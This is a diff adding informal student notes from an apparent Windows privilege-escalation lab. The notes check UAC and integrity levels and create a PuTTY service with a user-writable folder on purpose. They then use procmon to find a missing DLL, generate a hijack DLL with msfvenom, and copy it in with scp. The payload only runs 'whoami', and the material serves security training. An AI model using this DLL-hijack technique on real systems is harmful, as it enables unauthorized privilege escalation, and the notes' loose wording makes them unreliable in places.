@@ -1,1 +1,54 @@
+check uac settings
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+
+PS C:\users\student> .\Downloads\SysinternalsSuite\\sigcheck.exe -m -accepteula C:\Windows\System32\eventvwr.exe
+
+Integrity Levels
+  untrused - Anonymous SID access tokens
+  low - Everyone SID access token (World)
+  medium - Authenticated Users
+  high - Administrators
+  system - System services (LocalSystem, LocalService, NetworkService)
+
+Requested Execution Levels
+    asInvoker
+    highestAvailable
+
+schtasks /query /fo LIST /v
+(USE GUI WINDOWS) //task scheduler
+
+demo:
+admin ps prompt
+https://the.earth.li/~sgtatham/putty/0.67/x86/putty.exe (url or run it in ps)
+PS C:\Users\student\Downloads> Invoke-WebRequest https://the.earth.li/~sgtatham/putty/0.67/x86/putty.exe
+PS C:\Users\student\Downloads> mkdir "C:\Program Files (x86)\Putty" //Making a dir for where to put putty into.
+PS C:\Users\student\Downloads> move .\putty.exe 'C:\Program Files (x86)\Putty\' //Move wherever we downloaded that jawn to, to the new dir. yn
+PS C:\Users\student\Downloads> sc.exe create puttyService binPath='C:\Program Files (x86)\Putty\putty.exe' displayname='puttyService' start=auto
+PS C:\Users\student\Downloads> icacls 'C:\Program Files (x86)\Putty' /grant BUILTIN\USERS:W
+search for services app //checking that putty is there yfm yn
+Organize by desc or look for sus services, double cick
+File explorer --> putty. New text file: yes: write file perms good to go
+procmon. filter. process name contains putty.exe, path contains .dll, result is name not found. add all
+look at fliters and look for the dll (in this case sspicli.dll)
+student@lin-ops:~$ msfvenom -p windows/exec CMD='cmd.exe /C "whoami" > C:\Users\student\Desktop\whoami.txt' -f dll > SSPICLI.dll   //create dll that schtask may need
+PS C:\Users\student\Downloads> scp student@10.50.29.94:SSPICLI.dll 'C:\Program Files (x86)\Putty'
+if u can rename the exe, u can ... if u cant rename the exe there is a dll involved or sum like dat yur
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
